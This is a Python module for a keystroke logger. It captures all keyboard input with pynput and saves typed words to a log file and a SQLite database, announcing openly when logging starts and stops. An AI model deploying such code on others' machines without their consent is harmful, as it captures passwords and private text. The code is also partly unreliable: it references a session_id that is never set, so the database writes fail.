#tracks and logs keyboard activity
import os
import datetime
import sqlite3
from pynput import keyboard
from database import init_db

class KeystrokeLogger:
    def __init__(self, logfile="logs/keystrokes.txt", on_key_press=None):
        self.logfile = logfile
        self.on_key_press_callback = on_key_press  #callback on key press
        self.listener = None
        self.pressed_keys = set()
        self.current_word = ""
        self.key_count = 0  #internal counter

        #create log folder if missing
        log_dir = os.path.dirname(self.logfile)
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)

        init_db()  #ensure database exists

    def start(self):
        #start the keylogger in a background
        self.listener = keyboard.Listener(
            on_press=self._handle_key_press,
            on_release=self._handle_key_release
        )
        self.listener.start()
        print("Keystroke logging started.")

    def stop(self):
        #stop the keylogger and flush remaining text
        if self.current_word:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self._save_to_file(timestamp, self.current_word)
            print(f"Flushed remaining word: {self.current_word}")
        if self.listener:
            self.listener.stop()
            print("Keystroke logging stopped.")

    def _handle_key_press(self, key):
        # handle when a key is pressed
        self.pressed_keys.add(key)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            # print characters (letters, numbers, symbols)
            if hasattr(key, 'char') and key.char is not None and key.char.isprintable():
                self.current_word += key.char.replace('\f', '')
            elif key == keyboard.Key.space or key == keyboard.Key.enter:
                # Word complete
                if self.current_word:
                    self._save_to_file(timestamp, self.current_word)
                    self.current_word = ""
                if key == keyboard.Key.enter:
                    self._save_to_file(timestamp, "[ENTER]")
        except Exception as e:
            print(f"[ERROR] Key press failed: {e}")

        self.key_count += 1

        if self.on_key_press_callback:
            self.on_key_press_callback()  # notify UI

    def _handle_key_release(self, key):
        # handle key release event
        self.pressed_keys.discard(key)

    def _save_to_file(self, timestamp, content):
        # write keystroke data to log file and database
        try:
            # log to file
            with open(self.logfile, "a") as f:
                f.write(f"[{timestamp}] {content}\n")

            # store in SQLite
            conn = sqlite3.connect("monitoring.db")
            cursor = conn.cursor()
            cursor.execute("INSERT INTO keystrokes (session_id, timestamp, text) VALUES (?, ?, ?)",
                           (self.session_id, timestamp, content))
            conn.commit()
            conn.close()

        except Exception as e:
            print(f"[ERROR] Failed to write keystroke: {e}")

    #utilities
    def set_logfile(self, path):
        self.logfile = path

    def reset_count(self):
        self.key_count = 0

    def get_count(self):
        return self.key_count
